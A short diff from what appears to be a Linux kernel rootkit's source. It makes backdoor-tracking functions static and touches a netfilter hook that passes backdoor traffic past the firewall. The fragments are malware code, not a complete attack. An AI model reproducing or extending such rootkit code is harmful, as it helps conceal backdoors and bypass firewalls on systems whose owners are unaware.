@@ -367,7 +367,7 @@ void kv_show_active_backdoors(void)
 #endif
 }
 
-bool kv_bd_established(__be32 *daddr, int dport, bool established)
+static bool _bd_established(__be32 *daddr, int dport, bool established)
 {
 	bool rc = false;
 	struct iph_node_list *node, *node_safe;
@@ -423,7 +423,7 @@ void kv_bd_cleanup_item(__be32 *saddr)
  *  1 - to remove one single address node if force == false
  *  2 - to otherwise, clean everything
  */
-void _bd_cleanup(bool force)
+static void _bd_cleanup(bool force)
 {
 	struct iph_node_list *node, *node_safe;
 	list_for_each_entry_safe (node, node_safe, &iph_node, list) {
@@ -494,7 +494,7 @@ struct check_bdkey_t {
 	uint64_t address_value;
 };
 
-void _bdkey_callback(const u8 *const buf, size_t buflen, size_t copied,
+static void _bdkey_callback(const u8 *const buf, size_t buflen, size_t copied,
 		     void *userdata)
 {
 	struct check_bdkey_t *validate = (struct check_bdkey_t *)userdata;
@@ -632,7 +632,7 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
          * This information is crucial for retaining the state and addresses of this connection, which is
          * stored throughout the lifetime of the backdoor.
          */
-		if (kv_bd_established(&iph->daddr, dstport,
+		if (_bd_established(&iph->daddr, dstport,
 				      (skb->sk->sk_state == TCP_ESTABLISHED))) {
 			/**
              * Kick this packet out to the wire yay!
